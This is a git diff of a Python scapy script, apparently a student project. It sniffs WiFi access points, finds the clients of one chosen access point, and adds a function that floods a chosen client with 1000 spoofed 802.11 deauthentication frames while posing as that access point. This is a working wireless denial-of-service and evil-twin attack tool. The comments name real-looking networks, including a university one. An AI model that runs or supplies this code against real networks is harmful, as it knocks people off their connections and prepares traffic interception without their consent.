@@ -1,5 +1,5 @@
 from scapy.all import *
-from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt
+from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11Deauth
 from scapy.layers.l2 import Ether
 from scapy.layers.inet import IP
 from scapy.config import conf
@@ -16,8 +16,8 @@ networks.set_index("BSSID", inplace=True)
 
 isSniffing = True
 
-bssid_to_scan = '34:49:5b:20:9a:24'
-clients = []
+bssid_to_scan = ''
+clients = set()
 
 
 def callback(packet):
@@ -39,11 +39,18 @@ def callback(packet):
         networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)
 
 
-def print_all():
-    while True:
+def print_APs():
+    while isSniffing:
         os.system("clear")
         print(networks)
         time.sleep(0.5)
+
+
+def print_scanned_clients():
+    while True:
+        os.system("clear")
+        print(clients)
+        time.sleep(1)
 
 
 def change_channel():
@@ -55,32 +62,33 @@ def change_channel():
         time.sleep(0.5)
 
 
-
 def get_AP_clients(pkt):
-
     if pkt.haslayer(Dot11):
         client_mac = ''
         if pkt.type == 2:
-            pdb.set_trace()
-            if pkt.addr3 == bssid_to_scan:
+            from_ds = pkt[Dot11].FCfield & 0x1 != 0
+            to_ds = pkt[Dot11].FCfield & 0x2 != 0
+            if to_ds and not from_ds and pkt.addr2 == bssid_to_scan:
                 client_mac = pkt.addr1
-
-            elif pkt.addr1 == bssid_to_scan:
+            if from_ds and not to_ds and pkt.addr1 == bssid_to_scan:
                 client_mac = pkt.addr2
-
-            elif pkt.addr2 == bssid_to_scan:
-                client_mac = pkt.addr1
             if client_mac:
-                clients.append(client_mac)
+                clients.add(client_mac)
+
+
+def deauth_target(target_mac, twin_mac):
+    dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=twin_mac, addr3=twin_mac)
+    pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
+    sendp(pkt, inter=0.1, count=1000, iface=conf.iface, verbose=1)
 
 
 if __name__ == "__main__":
     # interface name, check using iwconfig
     conf.iface = "wlxc83a35c2e0bb"
     # start the thread that prints all the networks
-    # printer = Thread(target=print_all)
-    # printer.daemon = True
-    # printer.start()
+    printer = Thread(target=print_APs)
+    printer.daemon = True
+    printer.start()
     # start the channel changer
     channel_changer = Thread(target=change_channel)
     channel_changer.start()
@@ -89,7 +97,16 @@ if __name__ == "__main__":
     sniff(prn=callback, monitor=True, timeout=10)
     isSniffing = False
 
-    bssid_to_scan = networks[networks["SSID"] == "EitanAlona"].index[0]
+    # bssid_to_scan = networks[networks["SSID"] == "Ariel-University-2.4"].index[0]
+    print("Enter mac address of AP to sacn")
+    bssid_to_scan = input()
+
     print(f'Start scanning clients on {bssid_to_scan}')
-    sniff(prn=get_AP_clients, monitor=True, timeout=12)
+    sniff(prn=get_AP_clients, monitor=True, stop_filter=lambda x: len(clients) > 0, timeout=120)
+
+    print(f"clients connected to the AP you choose: {clients}")
+
+    target_mac = input("Enter target mac: ")
+    deauth_target(target_mac, bssid_to_scan)
+
     pdb.set_trace()
